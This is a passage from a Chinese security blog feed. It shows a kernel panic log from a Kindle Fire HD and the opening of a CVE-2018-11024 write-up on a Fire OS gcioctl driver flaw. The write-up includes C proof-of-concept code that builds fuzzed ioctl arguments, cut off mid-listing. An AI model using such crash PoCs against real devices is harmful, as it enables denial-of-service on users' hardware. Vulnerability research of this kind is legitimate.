********</span><br><span class="line">[  382.222106] d2c4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.232788] d2e4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.243316] d304  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.253997] d324  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.264678] d344  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.275238] d364  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.286071] d384  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.296752] d3a4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.307434] </span><br><span class="line">[  382.307434] R8: 0xc25e6518:</span><br><span class="line">[  382.312408] 6518  c2410c00 000008a8 c0a10a88 00000000 c16281fc 00000000 00000000 00000000</span><br><span class="line">[  382.323059] 6538  00000000 000003e8 c25e6000 00000093 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.333587] 6558  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.344268] 6578  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.354919] 6598  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.365600] 65b8  00000000 00000000 00000000 00000028 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.376129] 65d8  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.386779] 65f8  00000000 00000000 00000093 00000093 0000004d 00000002 00000000 00000000</span><br><span class="line">[  382.397308] </span><br><span class="line">[  382.397338] R9: 0xdd3e8c28:</span><br><span class="line">[  382.402282] 8c28  dd3e8c28 dd3e8c28 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[  382.412933] 8c48  00000000 00000000 dd3e8c50 dd3e8c50 00000000 c0aa5174 c0aa5174 c0aa5148</span><br><span class="line">[  382.423614] 8c68  5aefce7f 00000000 00000000 00000000 dd3e8c80 00000000 00000000 00000000</span><br><span class="line">[  382.434112] 8c88  00200000 00000000 00000000 dd3e8c94 dd3e8c94 dd3d2380 dd3d2380 00000000</span><br><span class="line">[  382.444793] 8ca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd154400</span><br><span class="line">[  382.455322] 8cc8  dd3e8d80 dd35ce70 00001064 00000001 0fb00000 5aefce7f 2cb41780 5aefce7f</span><br><span class="line">[  382.466003] 8ce8  2cb41780 5aefce7f 2cb41780 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.476531] 8d08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 dd3e8d24</span><br><span class="line">[  382.487182] Process gcioctl_poc_2 (pid: 4073, stack limit &#x3D; 0xde9422f8)</span><br><span class="line">[  382.494689] Stack: (0xde943e58 to 0xde944000)</span><br><span class="line">[  382.499603] 3e40:                                                       00000000 be8075c8</span><br><span class="line">[  382.508819] 3e60: de943f04 de943e70 c0317704 c031712c 00000001 00000028 be8075c8 de943ea0</span><br><span class="line">[  382.517913] 3e80: de943e98 de943e90 c0207454 c00bd920 de943e90 de943e90 de943e98 de943e98</span><br><span class="line">[  382.527130] 3ea0: 00000000 00000002 00000002 eddad33f 41414141 41414141 41414141 41414141</span><br><span class="line">[  382.536346] 3ec0: 41414141 41414141 41414141 d7b96700 de943efc de943ee0 c02089fc 00000000</span><br><span class="line">[  382.545562] 3ee0: d74f9540 00000004 d74f9540 be8075c8 dd3e8ca8 00000000 de943f74 de943f08</span><br><span class="line">[  382.554656] 3f00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190</span><br><span class="line">[  382.563873] 3f20: dcf8c770 de943f0c de942000 be807638 be8075c8 c02c5d6d d74f9540 00000004</span><br><span class="line">[  382.573120] 3f40: de942000 00000000 de943f64 00000000 be8075c8 c02c5d6d d74f9540 00000004</span><br><span class="line">[  382.582183] 3f60: de942000 00000000 de943fa4 de943f78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[  382.591430] 3f80: 00000400 be807638 00010e64 00000000 00000036 c0013e08 00000000 de943fa8</span><br><span class="line">[  382.600646] 3fa0: c0013c60 c0136578 be807638 00010e64 00000004 c02c5d6d be8075c8 be8075c8</span><br><span class="line">[  382.609863] 3fc0: be807638 00010e64 00000000 00000036 00000000 00000000 00000000 be807624</span><br><span class="line">[  382.618927] 3fe0: 00000000 be8075ac 000106a0 0002918c 60000010 00000004 00000000 00000000</span><br><span class="line">[  382.628143] Backtrace: </span><br><span class="line">[  382.631164] [&lt;c0317120&gt;] (free_buffer+0x0&#x2F;0x13c) from [&lt;c0317704&gt;] (dev_ioctl+0x2c8&#x2F;0x10c4)</span><br><span class="line">[  382.640563]  r5:be8075c8 r4:00000000</span><br><span class="line">[  382.644958] [&lt;c031743c&gt;] (dev_ioctl+0x0&#x2F;0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[  382.654388] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[  382.663604] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[  382.673004]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e64 r4:be807638</span><br><span class="line">[  382.681304] Code: e1a02005 e5940004 e5b21014 e5853014 (e5832004) </span><br><span class="line">[  382.697326] Board Information: </span><br><span class="line">[  382.697357]  Revision : 0001</span><br><span class="line">[  382.697357]  Serial	: 0000000000000000</span><br><span class="line">[  382.697387] SoC Information:</span><br><span class="line">[  382.697387]  CPU	: OMAP4470</span><br><span class="line">[  382.697418]  Rev	: ES1.0</span><br><span class="line">[  382.697418]  Type	: HS</span><br><span class="line">[  382.697418]  Production ID: 0002B975-000000CC</span><br><span class="line">[  382.697448]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[  382.697448] </span><br><span class="line">[  382.733703] ---[ end trace 58e760c9cd2996a9 ]---</span><br><span class="line">[  382.739074] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[  382.744964] CPU1: stopping</span><br><span class="line">[  382.748229] Backtrace: </span><br><span class="line">[  382.751251] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[  382.760742]  r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950</span><br><span class="line">[  382.767761] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[  382.777008] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[  382.786499] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40&#x2F;0x70)</span><br><span class="line">[  382.795684] Exception stack(0xde885e98 to 0xde885ee0)</span><br><span class="line">[  382.801483] 5e80:                                                       de885ee0 0000d120</span><br><span class="line">[  382.810577] 5ea0: 1ce88a9c 00000059 1cc00792 00000059 c161e498 00000000 c09ece64 de960480</span><br><span class="line">[  382.819793] 5ec0: c0ad01c8 de885f0c 0000017e de885ee0 c008e350 c0431ae0 600f0013 ffffffff</span><br><span class="line">[  382.829010]  r6:ffffffff r5:600f0013 r4:c0431ae0 r3:c008e350</span><br><span class="line">[  382.836029] [&lt;c0431a90&gt;] (cpuidle_wrap_enter+0x0&#x2F;0x9c) from [&lt;c04310c0&gt;] (cpuidle_enter_tk+0x18&#x2F;0x1c)</span><br><span class="line">[  382.846374]  r7:00000000 r6:c161e498 r5:c161e498 r4:de96048c</span><br><span class="line">[  382.853515] [&lt;c04310a8&gt;] (cpuidle_enter_tk+0x0&#x2F;0x1c) from [&lt;c04315dc&gt;] (cpuidle_enter_state+0x1c&#x2F;0x78)</span><br><span class="line">[  382.863983] [&lt;c04315c0&gt;] (cpuidle_enter_state+0x0&#x2F;0x78) from [&lt;c04334b8&gt;] (cpuidle_enter_state_coupled+0x13c&#x2F;0x36c)</span><br><span class="line">[  382.875518]  r6:de884000 r5:c161e498 r4:de96048c r3:00000000</span><br><span class="line">[  382.882659] [&lt;c043337c&gt;] (cpuidle_enter_state_coupled+0x0&#x2F;0x36c) from [&lt;c043176c&gt;] (cpuidle_idle_call+0x134&#x2F;0x31c)</span><br><span class="line">[  382.894256] [&lt;c0431638&gt;] (cpuidle_idle_call+0x0&#x2F;0x31c) from [&lt;c0015294&gt;] (cpu_idle+0xa4&#x2F;0x10c)</span><br><span class="line">[  382.903961] [&lt;c00151f0&gt;] (cpu_idle+0x0&#x2F;0x10c) from [&lt;c0695650&gt;] (secondary_start_kernel+0x118&#x2F;0x13c)</span><br><span class="line">[  382.914093] [&lt;c0695538&gt;] (secondary_start_kernel+0x0&#x2F;0x13c) from [&lt;80694ff4&gt;] (0x80694ff4)</span><br><span class="line">[  382.923400]  r6:10c0387d r5:00000015 r4:9e84c06a r3:c0694fdc</span><br><span class="line">[  382.930603] CPU0 PC (0) : 0xc003ee38</span><br><span class="line">[  382.934661] CPU0 PC (1) : 0xc003ee54</span><br><span class="line">[  382.938720] CPU0 PC (2) : 0xc003ee54</span><br><span class="line">[  382.942901] CPU0 PC (3) : 0xc003ee54</span><br><span class="line">[  382.946960] CPU0 PC (4) : 0xc003ee54</span><br><span class="line">[  382.951019] CPU0 PC (5) : 0xc003ee54</span><br><span class="line">[  382.955200] CPU0 PC (6) : 0xc003ee54</span><br><span class="line">[  382.959259] CPU0 PC (7) : 0xc003ee54</span><br><span class="line">[  382.963317] CPU0 PC (8) : 0xc003ee54</span><br><span class="line">[  382.967376] CPU0 PC (9) : 0xc003ee54</span><br><span class="line">[  382.971557] CPU1 PC (0) : 0xc0019b2c</span><br><span class="line">[  382.975616] CPU1 PC (1) : 0xc0019b2c</span><br><span class="line">[  382.979675] CPU1 PC (2) : 0xc0019b2c</span><br><span class="line">[  382.983856] CPU1 PC (3) : 0xc0019b2c</span><br><span class="line">[  382.987915] CPU1 PC (4) : 0xc0019b2c</span><br><span class="line">[  382.991973] CPU1 PC (5) : 0xc0019b2c</span><br><span class="line">[  382.996154] CPU1 PC (6) : 0xc0019b2c</span><br><span class="line">[  383.000213] CPU1 PC (7) : 0xc0019b2c</span><br><span class="line">[  383.004272] CPU1 PC (8) : 0xc0019b2c</span><br><span class="line">[  383.008453] CPU1 PC (9) : 0xc0019b2c</span><br><span class="line">[  383.012512] </span><br><span class="line">[  383.014312] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[  383.014312] </span><br></pre></td></tr></table></figure></blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Amazon</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2018-11024）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11024%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3的内核组件中的内核模块/omap/drivers/misc/gcx/gcioctl/gcif.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ gcioctl使用命令1077435789并导致内核崩溃。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;	  //strlen</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt; //inet_addr</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;	  //write</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Socket boilerplate code taken from here: http://www.binarytides.com/server-client-example-c-sockets-linux/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blobs</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span> debug = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> src_id;</span><br><span class="line">	<span class="keyword">int</span> dst_id;</span><br><span class="line">	<span class="keyword">int</span> offset;</span><br><span class="line">&#125; <span class="keyword">map_entry_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">short</span> tiny_vals[<span class="number">18</span>] = &#123;<span class="number">128</span>, <span class="number">127</span>, <span class="number">64</span>, <span class="number">63</span>, <span class="number">32</span>, <span class="number">31</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">256</span>, <span class="number">255</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> *small_vals;</span><br><span class="line"><span class="keyword">int</span> num_small_vals;</span><br><span class="line"></span><br><span class="line"><span class="comment">// populates small_vals when called</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">populate_arrs</span><span class="params">(<span class="keyword">int</span> top)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (num &lt; top) &#123;</span><br><span class="line">		<span class="comment">//printf(&quot;%d\n&quot;, num);</span></span><br><span class="line">		num &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">		count += <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// top</span></span><br><span class="line">	count += <span class="number">1</span>;</span><br><span class="line">	<span class="comment">// -1</span></span><br><span class="line">	count += <span class="number">1</span>;</span><br><span class="line">	num_small_vals = count;</span><br><span class="line">	num &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	small_vals = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*count);</span><br><span class="line">	<span class="built_in">memset</span>(small_vals, <span class="number">0</span>, count);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(num &gt; <span class="number">1</span>) &#123;</span><br><span class="line">		small_vals[i] = num;</span><br><span class="line">		i++;</span><br><span class="line">		small_vals[i] = num<span class="number">-1</span>;</span><br><span class="line">		i++;</span><br><span class="line">		num &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	small_vals[i] = <span class="number">0</span>;</span><br><span class="line">	small_vals[i+<span class="number">1</span>] = top;</span><br><span class="line">	small_vals[i+<span class="number">2</span>] = top<span class="number">-1</span>;</span><br><span class="line">	small_vals[i+<span class="number">3</span>] = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// generate a random value of size size and store it in elem.</span></span><br><span class="line"><span class="comment">// value has a weight % chance to be a &quot;small value&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gen_rand_val</span><span class="params">(<span class="keyword">int</span> size, <span class="keyword">char</span> *elem,  <span class="keyword">int</span> small_weight)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((rand() % <span class="number">100</span>) &lt; small_weight) &#123;</span><br><span class="line">		<span class="comment">// do small thing</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> idx = (rand() % num_small_vals);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Choosing %d\n&quot;</span>, small_vals[idx]);</span><br><span class="line">		<span class="keyword">switch</span> (size) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				idx = (rand() % <span class="number">18</span>);</span><br><span class="line">				*(<span class="keyword">short</span> *)elem = tiny_vals[idx];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				*(<span class="keyword">int</span> *)elem = small_vals[idx];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">				*(<span class="keyword">long</span> <span class="keyword">long</span>*)elem = small_vals[idx];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Damn bro. Size: %d\n&quot;</span>, size);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">			elem[i] = (<span class="keyword">char</span>)(rand()%<span class="number">0x100</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num_blobs = <span class="number">0</span>, num_mappings = <span class="number">0</span>, i = <span class="number">0</span>, dev_name_len = <span class="number">0</span>, j;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ioctl_id = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> *dev_name;</span><br><span class="line">	<span class="keyword">void</span> *tmp;</span><br><span class="line">	<span class="keyword">char</span> **ptr_arr;</span><br><span class="line">	<span class="keyword">int</span> *len_arr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> seed;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> sockfd , client_sock , c , read_size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span> , <span class="title">client</span>;</span></span><br><span class="line">	<span class="keyword">int</span> msg_size;</span><br><span class="line">	<span class="keyword">void</span> *generic_arr[<span class="number">264</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// max val for small_vals array</span></span><br><span class="line">	<span class="keyword">int</span> top = <span class="number">8192</span>;</span><br><span class="line">	<span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// chance that our generics are filled with &quot;small vals&quot;</span></span><br><span class="line">	<span class="keyword">int</span> default_weight = <span class="number">50</span>;</span><br><span class="line">	populate_arrs(top);</span><br><span class="line">	<span class="keyword">int</span> retest = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">goto</span> rerun;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	sockfd = socket(AF_INET , SOCK_STREAM , <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (sockfd == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Could not create socket&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Socket created&quot;</span>);</span><br><span class="line"></span><br><span class="line">	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;(<span class="keyword">int</span>)&#123; <span class="number">1</span> &#125;, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">	 </span><br><span class="line">	server.sin_family = AF_INET;</span><br><span class="line">	server.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">	server.sin_port = htons(atoi(argv[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Bind</span></span><br><span class="line">	<span class="keyword">if</span>( bind(sockfd,(struct sockaddr *)&amp;server , <span class="keyword">sizeof</span>(server)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//print the error message</span></span><br><span class="line">		perror(<span class="string">&quot;bind failed. Error&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;bind done&quot;</span>);</span><br><span class="line">listen:	 </span><br><span class="line">	<span class="comment">// Listen</span></span><br><span class="line">	listen(sockfd , <span class="number">3</span>);</span><br><span class="line">	 </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Waiting for incoming connections...&quot;</span>);</span><br><span class="line">	c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">	 </span><br><span class="line">	<span class="comment">// accept connection from an incoming client</span></span><br><span class="line">	client_sock = accept(sockfd, (struct sockaddr *)&amp;client, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">	<span class="keyword">if</span> (client_sock &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;accept failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Connection accepted&quot;</span>);</span><br><span class="line">	 </span><br><span class="line">	msg_size = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// Receive a message from client</span></span><br><span class="line">	<span class="keyword">while</span>( (read_size = recv(client_sock , &amp;msg_size , <span class="number">4</span> , <span class="number">0</span>)) &gt; <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// recv the entire message</span></span><br><span class="line">		<span class="keyword">char</span> *recv_buf = <span class="built_in">calloc</span>(msg_size, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">		<span class="keyword">if</span> (recv_buf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate recv_buf\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> nrecvd = recv(client_sock, recv_buf, msg_size, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (nrecvd != msg_size) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Error getting all data!\n&quot;</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;nrecvd: %d\nmsg_size:%d\n&quot;</span>, nrecvd, msg_size);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// quickly save a copy of the most recent data</span></span><br><span class="line">		<span class="keyword">int</span> savefd = open(<span class="string">&quot;/sdcard/saved&quot;</span>, O_WRONLY|O_TRUNC|O_CREAT, <span class="number">0644</span>);</span><br><span class="line">		<span class="keyword">if</span> (savefd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;open saved&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> err = write(savefd, recv_buf, msg_size);</span><br><span class="line">		<span class="keyword">if</span> (err != msg_size) &#123;</span><br><span class="line">			perror(<span class="string">&quot;write saved&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		fsync(savefd);</span><br><span class="line">		close(savefd);</span><br><span class="line">rerun:</span><br><span class="line">		<span class="keyword">if</span> (retest) &#123;</span><br><span class="line">			recv_buf = <span class="built_in">calloc</span>(msg_size, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">			<span class="keyword">int</span> fd = open(<span class="string">&quot;/sdcard/saved&quot;</span>, O_RDONLY);</span><br><span class="line">			<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">				perror(<span class="string">&quot;open:&quot;</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">int</span> fsize = lseek(fd, <span class="number">0</span>, SEEK_END);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;file size: %d\n&quot;</span>, fsize);</span><br><span class="line">			lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">			read(fd, recv_buf, fsize);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">char</span> *head = recv_buf;</span><br><span class="line">		seed = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blob_len_arr, blobs</span></span><br><span class="line">		<span class="built_in">memcpy</span>(&amp;seed, head, <span class="number">4</span>);</span><br><span class="line">		head += <span class="number">4</span>;</span><br><span class="line">		<span class="built_in">memcpy</span>(&amp;ioctl_id, head, <span class="number">4</span>);</span><br><span class="line">		head += <span class="number">4</span>;</span><br><span class="line">		<span class="built_in">memcpy</span>(&amp;num_mappings, head, <span class="number">4</span>);</span><br><span class="line">		head += <span class="number">4</span>;</span><br><span class="line">		<span class="built_in">memcpy</span>(&amp;num_blobs, head, <span class="number">4</span>);</span><br><span class="line">		head += <span class="number">4</span>;</span><br><span class="line">		<span class="built_in">memcpy</span>(&amp;dev_name_len, head, <span class="number">4</span>);</span><br><span class="line">		head += <span class="number">4</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// srand with new seed</span></span><br><span class="line">		srand(seed);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* dev name */</span></span><br><span class="line">		dev_name = <span class="built_in">calloc</span>(dev_name_len+<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">		<span class="keyword">if</span> (dev_name == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate dev_name\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">memcpy</span>(dev_name, head, dev_name_len);</span><br><span class="line">		head += dev_name_len;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* map */</span></span><br><span class="line">		<span class="keyword">map_entry_t</span> *<span class="built_in">map</span> = <span class="built_in">calloc</span>(num_mappings, <span class="keyword">sizeof</span>(<span class="keyword">map_entry_t</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">map</span> == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate map\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (num_mappings != <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">memcpy</span>(<span class="built_in">map</span>, head, num_mappings*<span class="keyword">sizeof</span>(<span class="keyword">map_entry_t</span>));</span><br><span class="line">			head += num_mappings*<span class="keyword">sizeof</span>(<span class="keyword">map_entry_t</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* blobs */</span></span><br><span class="line">		</span><br><span 